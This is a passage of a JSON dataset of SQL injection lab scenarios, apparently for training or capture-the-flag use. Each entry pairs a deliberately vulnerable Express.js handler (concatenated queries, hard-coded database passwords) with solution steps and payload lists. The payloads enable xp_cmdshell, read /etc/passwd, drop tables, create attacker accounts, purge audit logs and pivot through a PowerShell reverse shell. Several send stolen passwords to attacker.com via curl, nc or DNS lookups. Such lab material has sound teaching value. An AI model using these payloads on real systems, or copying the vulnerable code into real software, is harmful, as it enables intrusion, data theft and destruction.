    "payloads": [
      "100; EXEC xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\whoami.txt'--",
      "0; DECLARE @s VARCHAR(8000); SET @s=CAST(0x... AS VARCHAR(8000)); EXEC(@s);--",
      "1; DROP TABLE IF EXISTS tmp; CREATE TABLE tmp (data VARCHAR(8000)); BULK INSERT tmp FROM '\\attacker.com\\share\\payload.txt'; EXEC('');--",
      "100; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--"
    ]
  },
  {
    "Lab scenario": "Internal Admin Panel – SQLi in Role Assignment",
    "Lab Description": "An internal admin panel allows assigning roles to users through a vulnerable SQL query concatenated with user-controlled input. The input is directly passed to the SQL `UPDATE` query without proper sanitization. An attacker with limited access can escalate privileges by injecting into the role assignment input field. This scenario simulates a common misconfiguration where admin interfaces are assumed safe and are poorly validated.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as a low-privileged user with access to the role assignment interface",
      "Capture the POST request to `/admin/assign-role`",
      "Modify the `username` parameter to inject: `john'; UPDATE users SET role='admin' WHERE username='attacker`",
      "Observe successful privilege escalation by logging out and back in as `attacker`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/admin/assign-role', (req, res) => {\n  const username = req.body.username;\n  const role = req.body.role;\n  const sql = `UPDATE users SET role='${role}' WHERE username='${username}'`;\n  db.query(sql, (err) => {\n    if (err) return res.status(500).send('Database error');\n    res.send('Role updated');\n  });\n});",
    "payloads": [
      "john'; UPDATE users SET role='admin' WHERE username='attacker",
      "admin'; DROP TABLE logs;--"
    ]
  },
  {
    "Lab scenario": "Payment History Portal – SQLi in Dynamic Column Filter",
    "Lab Description": "The application backend allows users to search their payment history by various columns like `amount`, `status`, or `method`. The filter column name is user-controlled and directly used in the SQL query, leading to a classic SQLi vulnerability through the `ORDER BY` clause. An attacker can exploit this to inject malicious SQL and dump the full transaction history or manipulate sorting logic.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a GET request to `/payments?sort=amount`",
      "Inject payload: `1; SELECT version();--` in the `sort` parameter",
      "Use UNION-based injection to retrieve transaction secrets or configuration info",
      "Use pg_sleep for time-based confirmation if blind"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/payments', (req, res) => {\n  const sort = req.query.sort;\n  const sql = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Query error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount; SELECT pg_sleep(5)--",
      "id; DROP TABLE transactions--"
    ]
  },
  {
    "Lab scenario": "NGO Donor Portal – SQLi via Search Field with LIKE",
    "Lab Description": "The NGO's donation search feature is vulnerable due to unsanitized use of user input in a `LIKE` clause. Attackers can inject SQL using special characters and extract sensitive donor information such as email addresses, donation amount, and messages. This is a common real-world vulnerability due to poor filter design in keyword searches.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GET request: `/search?q=%' OR 1=1--`",
      "Use UNION to select data from `donors` table",
      "Use boolean-based blind SQLi to extract field-by-field info",
      "Automate the exploit using sqlmap"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const q = req.query.q;\n  const sql = `SELECT * FROM donations WHERE message LIKE '%${q}%'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
    "payloads": [
      "%' OR 1=1--",
      "%' UNION SELECT null,email,null FROM donors--"
    ]
  },
  {
    "Lab scenario": "GraphQL Backend – SQL Injection in Resolver Function",
    "Lab Description": "A GraphQL resolver directly includes user input from a search query in the SQL statement, making it vulnerable to SQL injection. The injection point is in the GraphQL `searchProducts(term: String)` operation. Exploiting this can lead to arbitrary SQL execution and access to sensitive product inventory details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a GraphQL query with a malicious `term` parameter",
      "Inject: `'; DROP TABLE inventory;--` or UNION injections",
      "Send request via GraphQL playground or API client",
      "Retrieve sensitive data from inventory or logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    searchProducts: async (_, { term }) => {\n      const sql = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n      return await db.query(sql);\n    }\n  }\n};",
    "payloads": [
      "'; DROP TABLE inventory;--",
      "' UNION SELECT credit_card FROM payments--"
    ]
  },
  {
    "Lab scenario": "Travel Booking – SQLi in Country Filter with Enumeration",
    "Lab Description": "This application lets users filter travel packages by country. However, the country parameter is unsanitized and directly included in the SQL query. This allows attackers to enumerate packages in other users’ accounts by bypassing country-level access control using injection in the filter parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GET request to `/packages?country=Italy`",
      "Inject: `Italy' OR 1=1--` to bypass country filter",
      "Use UNION to join with customer table",
      "Dump names and emails using crafted payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/packages', (req, res) => {\n  const country = req.query.country;\n  const sql = `SELECT * FROM travel_packages WHERE country='${country}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(500).send('Error fetching packages');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "Italy' OR 1=1--",
      "France' UNION SELECT name,email FROM users--"
    ]
  },
  {
    "Lab scenario": "Cloud Service - SQL Injection in API Key Authorization",
    "Lab Description": "A cloud service uses a weak implementation for API key lookup. It concatenates the `x-api-key` header value directly into a query. A malicious actor could modify the header and extract data from other tenants’ records or even bypass authentication altogether.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Send a GET request with crafted header: `x-api-key: key123' OR 1=1--`",
      "Access unauthorized resources via API response",
      "Test error-based injection to extract schema info",
      "Use time-based injection if output is blind"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/data', (req, res) => {\n  const apiKey = req.headers['x-api-key'];\n  const sql = `SELECT * FROM clients WHERE api_key='${apiKey}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(401).send('Invalid key');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "key123' OR 1=1--",
      "key123' UNION SELECT password FROM users--"
    ]
  },
  {
    "Lab scenario": "Employee Portal - SQL Injection in Login Field",
    "Lab Description": "The login form for internal employee authentication takes the username and password and embeds them directly into a SQL query. There is no use of prepared statements or sanitization, making it highly vulnerable. This classic injection can be used to bypass login and access internal records.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter `' OR '1'='1` as username and anything as password",
      "Observe login success without valid credentials",
      "Use UNION to extract employee emails from database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const user = req.body.username;\n  const pass = req.body.password;\n  const sql = `SELECT * FROM employees WHERE username='${user}' AND password='${pass}'`;\n  db.query(sql, (err, result) => {\n    if (result.length > 0) res.send('Welcome!');\n    else res.status(401).send('Unauthorized');\n  });\n});",
    "payloads": [
      "' OR '1'='1",
      "' UNION SELECT email FROM employees--"
    ]
  },
  {
    "Lab scenario": "Mobile API - SQL Injection in JSON Body Parameter",
    "Lab Description": "The mobile application sends JSON data containing search filters. The backend fails to validate or sanitize the `title` parameter in the JSON body. An attacker could send a malicious JSON payload to inject arbitrary SQL into the backend and retrieve internal documents.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send POST request: `{ \"title\": \"' OR 1=1--\" }`",
      "Use injection to list confidential documents",
      "Explore time-based and error-based techniques if needed"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const title = req.body.title;\n  const sql = `SELECT * FROM docs WHERE title='${title}'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' UNION SELECT body FROM docs--"
    ]
  },
  {
    "Lab scenario": "Support Chat System - SQL Injection via Cookie Parameter",
    "Lab Description": "The application identifies users using a session cookie that is directly passed to a SQL query. If an attacker modifies the cookie value to include SQL, it can be used to retrieve or manipulate chat history, impersonate another user, or drop session tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture cookie `session_id=abc123` and modify to `abc123' OR '1'='1`",
      "Inject via Burp Suite or browser extension",
      "Observe chat history from multiple users returned"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/chats', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  const sql = `SELECT * FROM messages WHERE session_id='${sessionId}'`;\n  db.query(sql, (err, messages) => {\n    if (err) return res.status(500).send('Chat fetch failed');\n    res.json(messages);\n  });\n});",
    "payloads": [
      "abc123' OR '1'='1",
      "xyz789' UNION SELECT content FROM logs--"
    ]
  },
  {
    "Lab scenario": "E-Commerce API Gateway UNION-Based SQLi in Product Filtering",
    "Lab Description": "A REST API for an online marketplace constructs SQL queries using unsanitized JSON input in WHERE clause parameters. The vulnerable endpoint returns detailed error messages through debug headers and allows UNION operators with explicit type casting. To solve: Extract credit card tokens from the 'payments' table using hex-encoded payloads while bypassing WAF filters that block quote characters and whitespace.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept POST /api/products/search request with Burp Suite using Content-Type: application/json",
      "2. Identify injectable parameter: {\"category\":\"electronics'\"} triggering SQL error",
      "3. Use Postman to send URL-encoded payload: {\"category\":\"'\\u0000'UNION/**/SELECT\\u0020NULL,CONVERT(VARBINARY(MAX),card_token),NULL\\u0020FROM\\u0020payments--\"}",
      "4. Bypass input filters using whitespace alternatives: SELECT%0bNULL,@@version,NULL--",
      "5. Decode hexadecimal results and purge audit logs with stacked query: ; TRUNCATE TABLE access_logs--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\napp.use(express.json({ limit: '50mb' }));\n\nconst config = {\n  user: 'api_user',\n  password: 'P@ssw0rd123',\n  server: 'dbserver',\n  options: { encrypt: false }\n};\n\napp.post('/api/products/search', async (req, res) => {\n  try {\n    const filters = req.body;\n    let whereClause = Object.entries(filters)\n      .map(([key, val]) => `${key} = '${val}'`)\n      .join(' AND ');\n\n    const query = `SELECT product_id, name, price FROM products WHERE ${whereClause}`;\n    console.debug('Executing query:', query); // Verbose logging\n    \n    const pool = await mssql.connect(config);\n    const result = await pool.request().query(query);\n    \n    res.set('X-Query-Time', Date.now()) // Debug header leakage\n       .json(result.recordset);\n  } catch (err) {\n    res.status(500)\n       .set('X-SQL-Error', err.message)\n       .json({ error: 'Query failed' });\n  }\n});\n\napp.listen(3000, () => console.log('API Gateway running on port 3000'));",
    "payloads": [
      "' UNION SELECT NULL,card_token,NULL FROM payments--",
      "' AND 1=CONVERT(INT,(SELECT TOP 1 card_token FROM payments))--",
      "'%00' UNION SELECT 1,CAST(card_token AS XML),3 FROM payments FOR XML PATH('')--",
      "'; INSERT INTO exfil(data) SELECT card_token FROM payments--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Blind SQLi in Patient Search HAVING Clause",
    "Lab Description": "A HIPAA-compliant patient management system constructs HAVING clauses using unsanitized user input with boolean response patterns. The application provides no direct error feedback but returns different HTTP status codes for true/false conditions. To solve: Extract sensitive medical record IDs using bitwise brute-force techniques and response timing analysis while evading rate limiting controls.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /patients?group=1",
      "2. Develop Python script using binary search: (ASCII(SUBSTRING((SELECT TOP 1 record_id FROM records),1)) & 128) = 128",
      "3. Bypass rate limits with rotating User-Agent headers and request throttling",
      "4. Automate extraction with sqlmap: sqlmap -u http://portal/patients?group=1* --technique=B --level=5 --risk=3",
      "5. Correlate extracted record IDs with patient database exports"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.get('/patients', async (req, res) => {\n  const groupId = req.query.group || '1';\n  const client = new pg.Client(process.env.DB_URL);\n  \n  try {\n    await client.connect();\n    const query = `\n      SELECT patient_id, COUNT(*) \n      FROM medical_records \n      GROUP BY patient_id \n      HAVING group_id = ${groupId}`;\n\n    const result = await client.query(query);\n    res.json(result.rows.length > 0 ? 200 : 404);\n  } catch (err) {\n    res.status(500).end();\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1 AND (SELECT SUBSTRING(record_id,1,1) FROM records OFFSET 0) = 'A'--",
      "1' AND (SELECT LENGTH(record_id) FROM records)=16 AND '1'='1",
      "1) AND EXTRACT(EPOCH FROM pg_sleep(5))::INTEGER = 5--",
      "1; SELECT CASE WHEN (ASCII(SUBSTR(record_id,1)) > 100 THEN pg_sleep(5) END--"
    ]
  },
  {
    "Lab scenario": "Banking App Error-Based SQLi in Transaction Sorting",
    "Lab Description": "A mobile banking application constructs ORDER BY clauses using unsanitized user input with verbose error logging enabled. The Microsoft SQL Server backend leaks database schema information through type conversion errors. To solve: Extract account numbers and balances using nested error-induced data exfiltration and second-order injection via scheduled transaction comments.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Trigger error: /transactions?sort=amount'+AND+1=CONVERT(int,(SELECT+user))--",
      "2. Extract table structure via error message analysis",
      "3. Craft nested error payload: sort=1'+AND+1=CONVERT(int,(SELECT+TOP+1+account_number+FROM+accounts))--",
      "4. Schedule transaction with comment payload: '; INSERT INTO transactions VALUES ('attacker', @@version)--",
      "5. Retrieve exfiltrated data from transaction history"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'bank_user',\n  password: 'Secure123!',\n  server: 'localhost',\n  options: { encrypt: true }\n};\n\napp.get('/transactions', async (req, res) => {\n  const sortColumn = req.query.sort || 'date';\n  try {\n    const pool = await mssql.connect(config);\n    const query = `SELECT * FROM transactions ORDER BY ${sortColumn}`;\n    const result = await pool.request().query(query);\n    res.json(result.recordset);\n  } catch (err) {\n    console.error('Full error:', err.originalError.message);\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1 AND 1=CONVERT(int,(SELECT TOP 1 account_number FROM accounts))--",
      "' AND 1=CAST((SELECT balance FROM accounts) AS INT)--",
      "; BEGIN TRANSACTION; INSERT INTO transactions VALUES ('attacker', (SELECT TOP 1 password FROM users)); COMMIT--",
      "ORDER BY (SELECT COUNT(*) FROM information_schema.tables)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Time-Based SQLi in Device Telemetry",
    "Lab Description": "An industrial IoT monitoring system constructs SQL queries using unsanitized device IDs in WHERE clauses. The PostgreSQL backend allows stacked queries with pg_sleep() function access but provides no direct output. To solve: Exfiltrate admin credentials through DNS-based out-of-band channel using conditional time delays and COPY TO PROGRAM vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /devices/1/telemetry",
      "2. Verify time delay: 1; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END--",
      "3. Configure Interactsh client for DNS callback monitoring",
      "4. Craft payload: 1; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?$(hostname)'--",
      "5. Correlate web server logs with extracted credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('pg');\nconst app = express();\n\nconst pool = new Pool({\n  host: 'localhost',\n  database: 'iot_metrics',\n  ssl: false\n});\n\napp.get('/devices/:id/telemetry', async (req, res) => {\n  const deviceId = req.params.id;\n  try {\n    const query = `SELECT * FROM telemetry WHERE device_id = ${deviceId}`;\n    const result = await pool.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send('Device query error');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1; SELECT CASE WHEN (SELECT COUNT(*) FROM users)=3 THEN pg_sleep(10) END--",
      "0; CREATE TEMP TABLE exfil(data text); INSERT INTO exfil SELECT password FROM users; COPY exfil TO PROGRAM 'nc attacker.com 1337'--",
      "1%3b%20CREATE%20OR%20REPLACE%20FUNCTION%20exfil(TEXT)%20RETURNS%20VOID%20AS%20$$%20COPY%20tmp%20FROM%20PROGRAM%20'curl%20http://attacker.com/?'||$1%3b%20$$%20LANGUAGE%20SQL%3b%20SELECT%20exfil(password)%20FROM%20users--",
      "0' UNION SELECT NULL,(SELECT current_database())--"
    ]
  },
  {
    "Lab scenario": "CMS Boolean-Based Blind SQLi in Article Comments",
    "Lab Description": "A content management system constructs SQL queries using unsanitized comment IDs with boolean response patterns. The MySQL backend provides no error messages but returns different HTML templates for true/false conditions. To solve: Extract administrator API keys through bit-shifting brute-force techniques and differential response analysis.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /comments/approve request with Burp Suite",
      "2. Identify injectable parameter: comment_id=1",
      "3. Develop Python script using bitwise operators: (ASCII(SUBSTR((SELECT api_key FROM users),1)) >> 7 & 1",
      "4. Optimize with binary search pattern matching",
      "5. Automate extraction with sqlmap: sqlmap -u http://cms/comments/approve --data 'comment_id=1*' --technique=B"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'cms_user',\n  password: 'insecure_pass',\n  database: 'wp_content'\n});\n\napp.post('/comments/approve', (req, res) => {\n  const commentId = req.body.comment_id;\n  const query = `UPDATE comments SET approved = 1 WHERE id = ${commentId}`;\n\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send('Approval failed');\n    res.send(result.affectedRows > 0 ? 'Approved' : 'Invalid comment');\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "1 AND (SELECT SUBSTRING(api_key,1,1) FROM users LIMIT 1) = 'a'--",
      "1' AND (SELECT LENGTH(api_key) FROM users)=32 AND '1'='1",
      "1) AND (SELECT IF(ASCII(SUBSTR(api_key,1)) > 100,1,0))=1--",
      "1 AND (SELECT COUNT(*) FROM users WHERE api_key LIKE 'a%')=1--"
    ]
  },
  {
    "Lab scenario": "Government Portal UNION SQLi in Document Metadata",
    "Lab Description": "A municipal document archive system constructs SQL queries using unsanitized document IDs with UNION operator support. The Oracle backend requires explicit NULL type casting and provides detailed error messages. To solve: Extract sensitive tax records through multi-stage UNION attacks with column type matching and XML encoding bypasses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /documents/12345",
      "2. Determine column count using ORDER BY 9999--",
      "3. Match column types: ' UNION SELECT NULL,NULL,NULL,NULL FROM DUAL--",
      "4. Extract data: ' UNION SELECT NULL,DBMS_LOB.SUBSTR(document_content),NULL,NULL FROM tax_records--",
      "5. Bypass output encoding using XMLAGG() function"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\n\napp.get('/documents/:id', async (req, res) => {\n  const docId = req.params.id;\n  try {\n    const conn = await oracledb.getConnection();\n    const query = `SELECT title, author, publish_date FROM documents WHERE doc_id = ${docId}`;\n    const result = await conn.execute(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,TO_CHAR(DBMS_LOB.SUBSTR(document_content)),NULL FROM tax_records--",
      "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL))--",
      "'%00' UNION SELECT NULL,XMLAGG(XMLELEMENT(e, tax_id)).EXTRACT('//text()'),NULL FROM records--",
      "'; EXECUTE IMMEDIATE 'CREATE USER attacker IDENTIFIED BY pwned'--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Out-of-Band SQLi in Notifications",
    "Lab Description": "A social media platform constructs SQL queries using unsanitized notification IDs with MSSQL xp_cmdshell access. The application blocks direct error output but allows DNS-based exfiltration. To solve: Execute reverse shell via SQL injection chain and pivot to internal chat systems using cracked service account credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter: POST /notifications/read",
      "2. Verify OOB DNS: 123; EXEC master..xp_cmdshell 'nslookup test.attacker.com'--",
      "3. Encode PowerShell reverse shell in hex",
      "4. Execute payload: ; EXEC xp_cmdshell 'powershell -e <encoded>'--",
      "5. Pivot to internal 10.0.5.0/24 network using cracked mssql_svc credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'social_user',\n  password: 'P@ssw0rd!',\n  server: 'dbserver',\n  options: { encrypt: false }\n};\n\napp.post('/notifications/read', async (req, res) => {\n  const notifId = req.body.notification_id;\n  try {\n    const pool = await mssql.connect(config);\n    await pool.request().query(\n      `UPDATE notifications SET read = 1 WHERE id = ${notifId}`\n    );\n    res.json({ success: true });\n  } catch (err) {\n    res.status(500).json({ error: 'Update failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "123; EXEC xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\whoami.txt'--",
      "0; DECLARE @s VARCHAR(8000); SET @s=0x...; EXEC(@s);--",
      "1; DROP TABLE IF EXISTS tmp; CREATE TABLE tmp (data VARCHAR(8000)); BULK INSERT tmp FROM '\\\\attacker.com\\share\\payload.txt'; EXEC('');--",
      "123; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--"
    ]
  },
  {
    "Lab scenario": "Education Portal Second-Order SQLi in Course Registration",
    "Lab Description": "A university portal stores unsanitized user input in course enrollment records that later gets used in batch processing queries. The PostgreSQL backend allows prepared statement bypass through JSON encoding. To solve: Poison course descriptions with time-based payloads and trigger nightly batch job to execute OS commands via COPY TO PROGRAM.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject course description: '||(SELECT CASE WHEN 1=1 THEN pg_sleep(5) END)--",
      "2. Schedule batch job with poisoned course entries",
      "3. Trigger nightly CSV generation through admin UI",
      "4. Exfiltrate data via DNS: COPY (SELECT password FROM users) TO PROGRAM 'nslookup $(hostname).attacker.com'",
      "5. Maintain persistence via cron job creation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\napp.use(express.json());\n\napp.post('/courses', async (req, res) => {\n  const { title, description } = req.body;\n  const client = new pg.Client(process.env.DB_URL);\n  \n  try {\n    await client.connect();\n    await client.query(\n      `INSERT INTO courses (title, description) \n       VALUES ('${title}', '${description}')`\n    );\n    res.send('Course created');\n  } catch (err) {\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users)=3 THEN pg_sleep(5) END)--",
      "'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/$(hostname)'--",
      "'%00' UNION SELECT NULL,(SELECT ARRAY_AGG(password) FROM users)::text,NULL--",
      "'; CREATE TABLE exfil(data text); GRANT ALL ON exfil TO PUBLIC; COPY exfil FROM PROGRAM 'whoami'--"
    ]
  },
  {
    "Lab scenario": "Logistics System Time-Based SQLi in Shipment Tracking",
    "Lab Description": "A global logistics platform constructs SQL queries using unsanitized tracking numbers in WHERE clauses. The MariaDB backend allows stacked queries with SLEEP() function access but provides no direct output. To solve: Exfiltrate shipment manifests through DNS-based out-of-band channel using conditional time delays and LOAD_FILE() function.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /tracking/ABC123",
      "2. Verify time delay: ' OR SLEEP(5)--",
      "3. Configure DNS monitoring with OOB testing endpoint",
      "4. Craft payload: ' OR (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT manifest FROM shipments),'.attacker.com'))--",
      "5. Correlate DNS logs with extracted shipment data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'logistics_user',\n  password: 'insecure_pass',\n  database: 'shipment_tracking'\n});\n\napp.get('/tracking/:id', (req, res) => {\n  const trackingId = req.params.id;\n  const query = `SELECT * FROM shipments WHERE tracking_id = '${trackingId}'`;\n\n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send('Tracking error');\n    res.json(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR SLEEP(10)--",
      "' OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT DATABASE()),'.attacker.com'))--",
      "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
      "'; SELECT SLEEP(5) INTO OUTFILE '/var/www/html/test.txt'--"
    ]
  },
  {
    "Lab scenario": "HR System Union-Based SQLi in Employee Search",
    "Lab Description": "A corporate HR platform constructs SQL queries using unsanitized search parameters in ORDER BY clauses. The MySQL backend returns unionized results in JSON format with type validation. To solve: Extract salary information and SSNs through multi-stage UNION attacks with explicit type casting and JSON array bypass techniques.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /employees/search with sort=name",
      "2. Determine column count using ORDER BY 9999--",
      "3. Match JSON types: ' UNION SELECT NULL,CAST(salary AS JSON),NULL--",
      "4. Bypass output encoding using JSON_ARRAYAGG()",
      "5. Decode results and purge audit logs using stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2/promise');\nconst app = express();\n\napp.post('/employees/search', async (req, res) => {\n  const { sort } = req.body;\n  const conn = await mysql.createConnection({\n    host: 'localhost',\n    user: 'hr_user',\n    password: 'HrP@ss123',\n    database: 'employee_db'\n  });\n\n  try {\n    const query = `SELECT id, name, department FROM employees ORDER BY ${sort}`;\n    const [rows] = await conn.query(query);\n    res.json(rows);\n  } catch (err) {\n    res.status(500).json({ error: err.message });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,CONCAT(name,':',ssn),NULL FROM payroll--",
      "' AND 1=CONVERT(JSON_EXTRACT((SELECT salary FROM payroll), '$[0]'), UNSIGNED)--",
      "'%00' UNION SELECT NULL,JSON_ARRAYAGG(ssn),NULL FROM employees--",
      "'; UPDATE employees SET salary=100000 WHERE user='admin'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal Time-Based SQL Injection in Login Authentication",
    "Lab Description": "This lab features a login form in a banking portal that uses unsafe string concatenation to authenticate users. It is vulnerable to time-based blind SQL injection using conditional delays. The application does not return errors or success messages clearly, but response delay can be used to infer success or failure. To solve: Exploit the time delay vulnerability to enumerate the administrator password one character at a time using tools like sqlmap or a custom Python script.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the POST request to /login.",
      "2. Inject a time-based payload into the username field: admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--",
      "3. Measure the delay using OWASP ZAP or sqlmap to infer true/false for each character.",
      "4. Write a script or use sqlmap to enumerate the password character by character.",
      "5. Use the discovered password to login as administrator."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (result.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid login');\n    }\n  });\n});",
    "payloads": [
      "admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--",
      "admin' AND SLEEP(5)--",
      "admin' OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Banking API GraphQL Union-Based SQLi in Transaction History",
    "Lab Description": "A financial institution's GraphQL endpoint constructs SQL queries using unsanitized input from 'orderBy' arguments in transaction history requests. The vulnerable implementation uses string concatenation for field sorting and returns full query errors through debug headers. To solve: Exfiltrate account PIN hashes using multi-stage UNION attacks with type coercion and GraphQL alias bypass techniques while evading special character filters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture GraphQL POST request in Burp Suite with 'orderBy' parameter",
      "2. Identify injection point: {\"query\":\"query { transactions(orderBy: \"amount_desc')\"}\"}}",
      "3. Use Postman to send nested query: 'orderBy: \"1' UNION SELECT NULL,salt,NULL,NULL FROM pins--\"",
      "4. Bypass WAF using GraphQL field aliases: pinHash:pin_hash::text",
      "5. Decode base64 results and purge audit logs using stacked mutation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst pg = require('pg');\n\nconst pool = new pg.Pool({\n  host: 'localhost',\n  user: 'bank_api',\n  password: 'Secur3P@ss',\n  database: 'transactions_db'\n});\n\nconst schema = `\n  type Transaction {\n    id: ID!\n    amount: Float!\n    date: String!\n  }\n  \n  type Query {\n    transactions(orderBy: String!): [Transaction]\n  }\n`;\n\nconst root = {\n  transactions: async ({ orderBy }) => {\n    try {\n      const query = `\n        SELECT id, amount, date \n        FROM transactions \n        ORDER BY ${orderBy} \n        LIMIT 100\n      `;\n      console.debug('Executing:', query); // Verbose logging\n      const res = await pool.query(query);\n      return res.rows;\n    } catch (err) {\n      throw new Error(`Query failed: ${err.message}`);\n    }\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: require('graphql').buildSchema(schema),\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000, () => console.log('GraphQL API running on port 3000'));",
    "payloads": [
      "\"1' UNION SELECT NULL,ENCODE(pin_hash,'base64'),NULL,NULL FROM pins--\"",
      "\"'||(SELECT salt FROM pins LIMIT 1)||'\"",
      "\"1'/**/UNION/*!50000SELECT*/table_name,column_name,NULL/*!FROM*/information_schema.columns--\"",
      "\"%00' UNION SELECT 1,pg_read_file('/etc/passwd'),3,4--"
    ]
  },
  {
